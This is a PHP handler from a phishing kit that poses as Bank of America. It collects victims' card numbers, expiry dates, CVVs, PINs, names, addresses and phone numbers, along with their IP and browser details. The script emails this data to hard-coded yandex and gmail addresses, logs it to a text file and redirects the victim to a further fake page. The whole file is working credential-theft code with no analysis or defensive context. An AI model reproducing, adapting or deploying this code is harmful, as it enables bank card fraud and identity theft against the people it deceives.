<?php 
$to = "goodgirl3900@yandex.com, benjuli1327@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "==================  BOA ".$ip."  ==================\n";
$message .= "CC Number : ".$_POST['ccn']."\n";
$message .= "Expiry Date : ".$_POST['expmonth']." / ".$_POST['expyear']."\n";
$message .= "CVV : ".$_POST['cvv']."\n";
$message .= "Pin : ".$_POST['pin']."\n";
$message .= "Fullname : ".$_POST['fullname']."\n";
$message .= "Address : ".$_POST['address']."\n";
$message .= "City : ".$_POST['city']."\n";
$message .= "State : ".$_POST['state']."\n";
$message .= "Zip Code : ".$_POST['zip']."\n";
$message .= "Phone Number : ".$_POST['phone']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "=============+FishFlow+===========\n";
$to = "cash.cow.cash@yandex.com, resultbackup2019@gmail.com";
$subj = " BOA CC Details  ||".$ip."\n";
$from = "From: BOA  <bboooaaaa@zillerrr.com>";
$fp = fopen('TTTTXXXXX.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
$praga=rand();
$praga=md5($praga);
Header ("Location: phone.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
?>